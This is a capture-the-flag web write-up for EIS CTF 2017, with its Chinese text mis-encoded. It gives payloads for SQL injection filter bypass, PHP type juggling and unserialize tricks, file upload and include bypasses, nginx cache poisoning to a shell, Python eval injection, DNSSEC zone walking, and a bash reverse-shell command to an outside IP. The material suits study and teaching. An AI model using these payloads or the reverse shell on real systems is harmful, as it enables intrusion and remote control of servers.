---
title:  EIS CTF 2017 Web  Write-up
subtitle: ä¸Šäº¤é«˜æ ¡è¿ç»´æ¯”èµ›
time: 2017.11.05 10:00:00
layout: post
catalog: true
tags:
- CTF
- Web
excerpt: ä¸Šäº¤é«˜æ ¡è¿ç»´æ¯”èµ›ï¼Œä»¥NISLåä¹‰å‚èµ›ã€‚

---

# EIS CTF

## Login

![1](https://momomoxiaoxi.com/img/post/EIS/1.png)

ç›²æ³¨ï¼Œå­˜åœ¨waf

and ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œç”¨%a0ç»•è¿‡ç©ºæ ¼ï¼Œ&&æ›¿ä»£ä¸ºandã€‚

`uname=admin'%a0%26%26%a0pwd>'1'--%a0&pwd=admin`

ç”¨burpsuiteä¾æ¬¡çˆ†ç ´ï¼Œå³å¯ã€‚ï¼ˆå­—ç¬¦ä¸²å¯ä»¥æ¯”è¾ƒï¼‰



## PHPæ˜¯æœ€å¥½çš„è¯­è¨€

http://202.112.26.124:8080/95fe19724cc6084f08366340c848b791/index.php.bakå­˜åœ¨æ–‡ä»¶æ³„æ¼

```php
<?php
$v1=0;$v2=0;$v3=0;
$a=(array)unserialize(@$_GET['foo']);
if(is_array($a)){
    is_numeric(@$a["param1"])?exit:NULL;
    if(@$a["param1"]){
        ($a["param1"]>2017)?$v1=1:NULL;
    }
    if(is_array(@$a["param2"])){
        if(count($a["param2"])!==5 OR !is_array($a["param2"][0])) exit;
        $pos = array_search("nudt", $a["param2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["param2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['egg'];
$d=@$_GET['fish'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        eregi("M|n|s",$d.$c[0])?err():NULL; 
        strpos(($c[0].$d), "MyAns")?$v3=1:NULL;
    }
}
if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}

?>


```

å‚è€ƒhttps://momomoxiaoxi.com/2016/07/24/X-NUCA/çš„Web4å³å¯ã€‚

Payload:

`http://202.112.26.124:8080/95fe19724cc6084f08366340c848b791/index.php?foo=a:5:{s:6:"param1";s:9:"2018adsad";s:6:"param2";a:5:{i:0;a:1:{i:0;i:0;}i:1;i:0;i:2;i:2;i:3;i:3;i:4;i:4;}s:2:"a2";i:3;s:1:"d";i:4;s:1:"e";i:5;}&egg[1][]=%221%22&fish=%00&egg[0]="MyAns"`

![2](https://momomoxiaoxi.com/img/post/EIS/2.png)

## æ–‡ä»¶ä¸Šä¼ 

æ°´é¢˜ï¼Œç”¨æ•°ç»„ç»•è¿‡æ­£åˆ™è¿‡æ»¤ã€‚è®¾å®šæ–‡ä»¶ååç¼€ä¸º.phpï¼Œæ–‡ä»¶å†…å®¹ä¸Šä¼ æ—¶ï¼Œå°†ä¸Šä¼ å†…å®¹å­—æ®µè®¾ä¸ºæ•°ç»„ï¼Œå³å¯ç»•è¿‡å¯¹å°–æ‹¬å·çš„è¿‡æ»¤ã€‚è®¿é—®ä¸Šä¼ çš„phpæ–‡ä»¶åå³å¯å¾—åˆ°flagã€‚

## éšæœºæ•°

```php
<?php
for($i=0;$i<1001;$i++) {
   srand($i);
   echo $i.' : '.rand(0,1000).', '.rand(0,1000).', '.rand(0,1000).', '.rand(0,1000).'</br>';
}
?>

```

é€šè¿‡ä¸Šè¿°ä»£ç ç”Ÿæˆäº†ä¸€ä¸ªç±»ä¼¼å½©è™¹è¡¨çš„ä¸œè¥¿ï¼ŒæŸ¥è¯¢ä¸€ä¸‹å³å¯ã€‚

![3](https://momomoxiaoxi.com/img/post/EIS/3.png)

## PHPä»£ç å®¡è®¡

```php
<?php   
error_reporting(0); 
include "flag1.php"; 
highlight_file(__file__); 
if(isset($_GET['args'])){ 
    $args = $_GET['args']; 
    if(!preg_match("/^\w+$/",$args)){ 
        die("args error!"); 
    } 
    eval("var_dump($$args);"); 
} 
```

$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡

$GLOBALS è¿™ç§å…¨å±€å˜é‡ç”¨äºåœ¨ PHP è„šæœ¬ä¸­çš„ä»»æ„ä½ç½®è®¿é—®å…¨å±€å˜é‡ï¼ˆä»å‡½æ•°æˆ–æ–¹æ³•ä¸­å‡å¯ï¼‰ã€‚

PHP åœ¨åä¸º $GLOBALS[index] çš„æ•°ç»„ä¸­å­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚

ä¼ å…¥ä¸€ä¸ªargså˜é‡ï¼Œæ­£åˆ™æ ¡éªŒä¹‹åï¼Œæœ€åå°±æ˜¯$$argsï¼Œè¿™ä¸ªæ˜¯é‡ç‚¹ï¼Œå³ä¼ å…¥çš„ä¸€ä¸ªå˜é‡çš„å€¼è¿˜å¯ä»¥ä½œä¸ºå¦ä¸€ä¸ªå˜é‡åï¼Œå› æ­¤å°è¯•åˆ©ç”¨PHPä¸­ç¥å¥‡çš„å…¨å±€å˜é‡globalï¼ŒæŸ¥çœ‹è¿™ä¸ªå˜é‡ä¸­åŒ…å«çš„æ•°æ®ï¼Œflagå°±åœ¨å…¶ä¸­.

Payload:http://202.112.26.124:8080/edd1620126f2caeb5c2b3b9452fa2639/index.php?args=GLOBALS

## å¿«é€Ÿè®¡ç®—

å†™ä¸ªè„šæœ¬äº¤äº’ä¸€ä¸‹å³å¯ã€‚

```php
import requests
import re
url = 'http://202.120.7.220:2333/'
res = requests.get(url)
calc = re.search(r'<br/>(.*)=<', res.content).groups()[0]
v = eval(calc)
print calc, '=', v
res = requests.post('http://202.120.7.220:2333/index.php', data={"v": v})
print res.content

```



## php trick

æ³¨é‡Šè·å¾—æºç ï¼š

```php
<?php     
		$flag='xxx';     
		extract($_GET);     
		if(isset($gift)){        
		    $content=trim(file_get_contents($flag));
		    if($gift==$content){ 
		       echo'flag';     }
		     else{       
		       echo'flagè¢«åŠ å¯†äº† å†åŠ å¯†ä¸€æ¬¡å°±å¾—åˆ°flagäº†';}   
		     } 
		?>

```

åˆ©ç”¨php:/inputå’Œå˜é‡è¦†ç›–å³å¯ã€‚

![4](https://momomoxiaoxi.com/img/post/EIS/4.png)

## ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿèƒ½ç™»å½•

æºç æ³„æ¼ï¼š

```php
 $test=$_GET['userid']; $test=md5($test); 
   if($test != '0'){ 
      	$this->error('ç”¨æˆ·åæœ‰è¯¯,è¯·é˜…è¯»è¯´æ˜ä¸å¸®åŠ©ï¼'); 
   	}
$pwd =$this->_post("password");
$data_u = unserialize($pwd);
if($data_u['name'] == 'XX' && $data_u['pwd']=='XX')
    {
      print_r($flag);
    }
```

å‰è€…æ˜¯md5æˆ0eå¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ã€‚åè€…åˆ©ç”¨å¸ƒå°”å¼±ç±»å‹ç»•è¿‡ã€‚å‚è€ƒï¼šhttp://www.cnblogs.com/ssooking/p/5877086.html

![5](https://momomoxiaoxi.com/img/post/EIS/5.png)

## Apache

HackluåŸé¢˜ï¼Œé˜Ÿå†…å¤§ä½¬carryã€‚

> é€šè¿‡__libc_start_mainåŠ«æŒstrlenå‡½æ•°æ¥å®‰è£…åé—¨ï¼Œæ»¡è¶³æ¡ä»¶çš„payloadå¯ä»¥è¢«systemæ‰§è¡Œï¼Œæœ€åé¦–å…ˆå‘é€ä¸€ä¸ªæ­£å¸¸çš„getè¯·æ±‚ï¼Œå†å‘é€/index.html?eqeqeqbnbnbnbnbkwkwkwkwhththththqeq=bash_-c_'bash_-i_>&_/dev/tcp/202.112.50.114/5555_0>&1'è·å¾—ä¸€ä¸ªreverse shell,ç›´æ¥cat flag.txtå³å¯ã€‚

URL ä¸­éœ€æœ‰ 'dpdpdpamamamamajvjvjvjvgsgsgsgsgpdp' or 'eqeqeqbnbnbnbnbkwkwkwkwhththththqeq'ï¼Œåâ¾¯é¢è·Ÿå‘½ä»¤å³å¯ï¼Œå…¶ä¸­ä¸‹åˆ’çº¿ä¼šè¢«æ›¿æ¢ä¸ºç©ºæ ¼ã€‚

## SimpleCMS

è¿™é¢˜æ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œåº”è¯¥æ˜¯ç¼“å­˜çš„é—®é¢˜ã€‚ä»¥å‰æ²¡ç ”ç©¶è¿‡ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚

ä¿¡æ¯ï¼š

1. ä¸¤ä¸ªæ–‡ä»¶åŒ…å«ç‚¹ï¼š

   - ?page=../../../../../../../../etc/passwd 

     ```php
     <?php
         if (isset($_GET['page'])) {
             $page = $_GET['page'];
         } else {
             $page = 'a.php';
         }

         $path = './pages/' . $page;
         $path = realpath($path);

         if (is_file($path)) {
             include $path;
         } else {
             echo '<p>Page not found!</p>';
         }
     ```

     â€‹

   - /static.php?f[]=/etc/passwd 

     ```php

     chdir('./static');

     if (!isset($_GET['f'])) {
         die();
     }

     // fix Content-Type if possible
     $uri = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
     $ext_pos = strrpos($uri, '.');
     $ext = strtolower(substr($uri, $ext_pos + 1));
     switch($ext) {
         case 'css':
             header('Content-Type: text/css');
             break;
         case 'js':
             header('Content-Type: application/javascript');
             break;
     }

     $static_files = $_GET['f'];

     if (!is_array($static_files)) {
         $static_files = array($static_files);
     }

     foreach($static_files as $file) {
         if (is_file($file)) {
             echo file_get_contents($file);
         } else {
             die("{$file} not exists!");
         }
     }
     ```

     â€‹

2. éƒ¨åˆ†HTTPå›å¤åŒ…ï¼Œå¤´éƒ¨æœ‰â€œX-Proxy-Cache: BYPASSâ€ï¼Œæ€€ç–‘æ˜¯includeä¸€ä¸ªç¼“å­˜ä¸´æ—¶æ–‡ä»¶ã€‚


èµ›åçœ‹äº†æµ™å¤§å’Œç¦å·å¤§å­¦çš„WPï¼Œå‘ç°çœŸçš„æ˜¯ç¼“å­˜ï¼ï¼orzï¼Œå­¦ä¹ ä¸€æ³¢ã€‚

ä¸»è¦è¦æŸ¥çœ‹fastcgiçš„ç¼“å­˜é…ç½®ï¼š/etc/nginx/nginx.conf

![fastcgi](https://momomoxiaoxi.com/img/post/EIS/6.png)



ç¼“å­˜çš„å‘½åçš„è§„åˆ™æ˜¯ï¼šmd5($host$url),ç„¶åæ˜¯1:2çš„å‘½åæ³•ã€‚åˆ™ç›®å½•ä¸ºtmp/åä¸€ä½ï¼åä¸‰-äºŒä½ï¼md5

æ³¨æ„ï¼šnginx çš„ $host æ˜¯ä¸å¸¦ç«¯å£çš„ï¼Œç¼“å­˜éœ€æ³¨æ„ã€‚

å¦‚ï¼š

> 202.120.7.205/static.php/l.js ï¼Œmd5 å“ˆå¸Œè¿‡åå¾—åˆ°çš„å€¼ä¸º bbbcb40ec7f308548f1d387c5ca763ba æŒ‰ç…§é…ç½®â½‚æ–‡ä»¶ä¸­æ‰€è§„å®šçš„ 1:2 çš„å‘½åæ³•ï¼Œå¯ä»¥å¾—åˆ°å®Œæ•´è·¯è·¯å¾„ ä¸ºï¼š /tmp/a/3b/bbbcb40ec7f308548f1d387c5ca763ba

ç„¶åï¼Œåˆ©ç”¨/static.phpä¼šå¯¹.csså’Œ.jsç»“å°¾æ–‡ä»¶è¿›è¡Œç¼“å­˜çš„ç‰¹æ€§ã€‚è€Œä¸”å½“å…¶ç¼“å­˜ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šç›´æ¥è¾“å‡ºæ–‡ä»¶åã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¼“å­˜ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œç¼“å­˜ä¸´æ—¶æ–‡ä»¶è¿˜ä¼šç”Ÿæˆï¼Œé‡Œé¢çš„å†…å®¹ä¼šæ˜¯xxx not existsï¼xxxæŒ‡æ–‡ä»¶åã€‚

é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œç¼“å­˜ä¸€ä¸ªä¸€å¥è¯åˆ°ç¼“å­˜ç›®å½•ã€‚

ç¦å·å¤§å­¦WPæˆªå›¾ï¼š

![cache1](https://momomoxiaoxi.com/img/post/EIS/7.png)

æ¥ç€ï¼Œåªéœ€è¦åˆ©ç”¨pageçš„æ–‡ä»¶åŒ…å«ï¼Œè¿›è¡Œåˆ©ç”¨å³å¯ã€‚æ–‡ä»¶ä½ç½®åˆ©ç”¨å‰é¢è¯´çš„ç¼“å­˜è§„åˆ™æ¨ç®—è€Œå¾—ã€‚

å¦‚ä¸‹ï¼š

![cache2](https://momomoxiaoxi.com/img/post/EIS/8.png)

getshellæˆåŠŸï¼ŒæŸ¥çœ‹ä¸€ä¸‹flagå³å¯ã€‚

PSï¼šäººå¯¹æœªçŸ¥çš„ä¸œè¥¿æ€»æ˜¯å……æ»¡ææƒ§ï¼Œåšé¢˜çš„æ—¶å€™æƒ³åˆ°äº†ç¼“å­˜ï¼Œä½†æ˜¯å› ä¸ºä»¥å‰æ²¡æ¥è§¦è¿‡ï¼Œå°±å®³æ€•ï¼Œæ”¾å¼ƒäº†ã€‚è‡ªçœï¼

## éªŒè¯ç 

è¿™é¢˜æ²¡åšå‡ºæ¥ï¼ŒWebsocketä¹Ÿä¸æ˜¯å¾ˆæ‡‚ã€‚å­¦ä¹ äº†ä¸‹Melodyçš„WPï¼Œä¸è¿‡ç°åœ¨è¿˜ä¸ç†è§£ä»–å¦‚ä½•åšåˆ°å°†melody.pyä¸Šä¼ ä¸Šå»çš„ã€‚é¢˜ç›®ç¯å¢ƒåˆå…³äº†ï¼Œæ²¡åŠæ³•å¤ç°ğŸ˜­ã€‚

è´´ä¸Šä»–çš„é¢˜è§£ï¼š

> æœ¬é¢˜é€»è¾‘ååˆ†ç®€å•ï¼Œè¯·æ±‚æœåŠ¡å™¨å™¨â¼€ä¸ªéªŒè¯ç ï¼ŒæœåŠ¡å™¨å™¨è¿”å›å­—ç¬¦ç”»ã€‚è¯·æ±‚ç»“æœï¼ŒæœåŠ¡ç«¯æ ¡éªŒç»“æœã€‚æœ‰â¼€ä¸ªéšè—çš„ help æŒ‡ä»¤ï¼Œå¯ä»¥ reconnectï¼Œé—®é¢˜åœ¨äºå¦‚ä½•æŒ‡å®š reconnect çš„æœåŠ¡å™¨ï¼Œå°†å‘ç»™ ws æœåŠ¡çš„ json ä¸­çš„å€¼ä¾æ¬¡æ›¿æ¢æˆ [] å¯ä»¥é€šè¿‡æŠ¥é”™ä¿¡æ¯æ¨æ–­åç«¯é€»è¾‘ï¼Œå¾—åˆ° method ä¼šè¢«å¸¦â¼Šå…¥åˆ° getattr ä¸­ï¼Œé‚£ä¹ˆå¿…é¡»å¾—æ˜¯â¼€ä¸€ä¸ªç±»ä¸­è§„å®šå¥½çš„â½…æ–¹ æ³•æ‰èƒ½å¤Ÿå¸¦â¼Šå…¥è¿›æ¥ï¼Œå¯è¡Œçš„æ“ä½œå¹¶ä¸ä¸å¤šï¼Œæµ‹è¯•äº†`__init__` å‡½æ•°ï¼Œæ ¹æ®é”™è¯¯ä¿¡æ¯å‘ç°å¯ä»¥å¸¦â¼Šä¸¤ä¸ªå‚æ•°ï¼Œ å› æ­¤å‘åŒ…å¦‚ä¸‹
>
> {"method":"__init__","args":[ip,port]}
>
> æ¥ç€è°ƒâ½¤ç”¨ reconnect
>
> {"method":"reconnect"}
>
> æ­¤æ—¶æœåŠ¡å™¨å™¨ä¸Šç›‘å¬çš„ç«¯â¼å£å·²æ”¶åˆ°ä¿¡æ¯ã€‚
>
> æˆ‘ä»¬ç»§ç»­è¯·æ±‚æ–°çš„éªŒè¯ç ï¼Œå‘ç°æœåŠ¡ç«¯å‘æˆ‘ä»¬è¯·æ±‚â¼€ä¸€ä¸ªæ“ä½œç¬¦ï¼Œæ“ä½œæ•°ç”±æœåŠ¡ç«¯â½£ç”Ÿæˆå¥½äº†äº†ï¼Œå› æ­¤çŒœæµ‹æ•´ä¸ªè¡¨è¾¾å¼è¢«å¸¦â¼Šå…¥åˆ° eval ä¸­å¾—åˆ°è¿”å›å€¼ï¼Œå†ç»™å®¢æˆ·æ ¡éªŒè®¡ç®—ç»“æœã€‚é‚£ä¹ˆç­”æ¡ˆä¹Ÿå°±æ˜¾â½½æ˜“è§äº†ã€‚æˆ‘ä»¬å°†ç»™å®¢æˆ·çš„æ“ä½œç¬¦å®š ä¹‰ä¸º
>
> `+__import__('os').system('python\x20/tmp/melody.py')+`
>
> é‚£ä¹ˆè¢«å¸¦â¼Šå…¥åˆ°åç«¯å°±ä¼šå˜æˆ
>
> `eval("1+__import__('os').system('python\x20/tmp/melody.py')+2") `
>
> æˆ‘ä»¬çš„ä»£ç å°±å¾—åˆ°æ‰§â¾è¡Œè¡Œäº†äº†ï¼Œå°è¯•åæˆåŠŸåå¼¹ shellã€‚ æœ€ååœ¨ arifmetics.py ä¸­æ‰¾åˆ° ï¬‚agã€‚
>
> ```python
> cat ar* 
> import asyncio 
> from hashlib import md5 
> from random import choice, randint 
> from threading import Thread
>
> SALT = b"EIS{87a5d7e4aae098be036d6b8035e4}
> ```
>
> 

## DNS 101

åˆ©ç”¨NSECèƒ½è·å¾—ä¸‹ä¸€æ¡æ•°æ®çš„ä¿¡æ¯ï¼Œæ¥é‡å¤è·å–ä¸‹ä¸€ä¸ªdnsè®°å½•ã€‚ï¼ˆä¸æ˜¯æ¼æ´ã€‚ã€‚æ„Ÿè§‰å¾ˆçº¯ç²¹çš„misc...ï¼‰

å…·ä½“å‚è€ƒæ®µè€å¸ˆçš„åšå®¢ï¼šhttps://netsec.ccert.edu.cn/duanhx/?p=1479

> #### 2.1.4  NSECè®°å½•
>
> NSECè®°å½•æ˜¯ä¸ºäº†åº”ç­”é‚£äº›ä¸å­˜åœ¨çš„èµ„æºè®°å½•è€Œè®¾è®¡çš„ã€‚ä¸ºäº†ä¿è¯ç§æœ‰å¯†é’¥çš„å®‰å…¨æ€§å’ŒæœåŠ¡å™¨çš„æ€§èƒ½ï¼Œæ‰€æœ‰çš„ç­¾åè®°å½•éƒ½æ˜¯äº‹å…ˆï¼ˆç”šè‡³ç¦»çº¿ï¼‰ç”Ÿæˆçš„ã€‚æœåŠ¡å™¨æ˜¾ç„¶ä¸èƒ½ä¸ºæ‰€æœ‰ä¸å­˜åœ¨çš„è®°å½•äº‹å…ˆç”Ÿæˆä¸€ä¸ªå…¬å…±çš„â€œä¸å­˜åœ¨â€çš„ç­¾åè®°å½•ï¼Œå› ä¸ºè¿™ä¸€è®°å½•å¯ä»¥è¢«é‡æ”¾ï¼ˆReplayï¼‰ï¼›æ›´ä¸å¯èƒ½ä¸ºæ¯ä¸€ä¸ªä¸å­˜åœ¨çš„è®°å½•ç”Ÿæˆç‹¬ç«‹çš„ç­¾åï¼Œå› ä¸ºå®ƒä¸çŸ¥é“ç”¨æˆ·å°†ä¼šè¯·æ±‚æ€æ ·çš„è®°å½•ã€‚
>
> åœ¨åŒºæ•°æ®ç­¾åæ—¶ï¼ŒNSECè®°å½•ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚æ¯”å¦‚åœ¨vpn.test.netå’Œxyz.test.netä¹‹é—´ä¼šæ’å…¥ä¸‹é¢çš„è¿™æ ·ä¸¤æ¡è®°å½•ï¼š
>
> > vpn.test.net.   10800   IN A       192.168.1.100
> >
> > 172800  NSEC    xyz.test.net. A RRSIG NSEC
> >
> > 172800  RRSIG   NSEC 5 5 172800 20110611031416 (
> >
> > 20110512031416 5271 test.net.
> >
> > Ujw/aqâ€¦.15dV5tF7XgWSR78= )
> >
> > xyz.test.net.  10800   IN A    192.168.1.200
>
> å…¶ä¸­NSECè®°å½•åŒ…æ‹¬ä¸¤é¡¹å†…å®¹ï¼šæ’åºåçš„ä¸‹ä¸€ä¸ªèµ„æºè®°å½•çš„åç§°ï¼ˆxyz.test.net.ï¼‰ã€ä»¥åŠvpn.test.net.è¿™ä¸€åç§°æ‰€æœ‰çš„èµ„æºè®°å½•ç±»å‹ï¼ˆAã€RRSIGã€NSECï¼‰ï¼Œåé¢çš„RRSIGè®°å½•æ˜¯å¯¹è¿™ä¸ªNSECè®°å½•çš„æ•°å­—ç­¾åã€‚
>
> åœ¨ç”¨æˆ·è¯·æ±‚çš„æŸä¸ªåŸŸååœ¨vpnå’Œxyzä¹‹é—´æ—¶ï¼Œå¦‚www.test.net.ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›åŸŸåä¸å­˜åœ¨ï¼Œå¹¶åŒæ—¶åŒ…æ‹¬ vpn.test.netçš„NSECè®°å½•

å†™ä¸€ä¸ªè„šæœ¬é€’å½’æŸ¥è¯¢ï¼š

```bash
#!/bin/bash

query="0ouqoeflewroatrouwroafl0priexlev.zzzzzzz.flag.src.edu-info.edu.cn"

while true; do
	echo "Digging $query"
	res=$(dig "$query" any +short +dnssec)
	echo $res
	query=$(echo $res | egrep -o "[a-z0-9\.\-]+\.zzzzzzz\.flag\.src.edu-info\.edu.cn\.")
	if [[ $query == "" ]]; then break; fi
	if echo -n "$query" | grep "flag-id-"; then
		dig "$query" txt
		break
	fi
done

```

